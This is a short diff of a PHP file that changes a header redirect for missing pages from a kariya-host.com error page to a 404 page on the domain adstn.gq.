@@ -1,3 +1,3 @@
 ﻿<?php
-header("Location: http://www.kariya-host.com/error.php?404") ; 
+header("Location: https://www.adstn.gq/404") ; 
   ?>
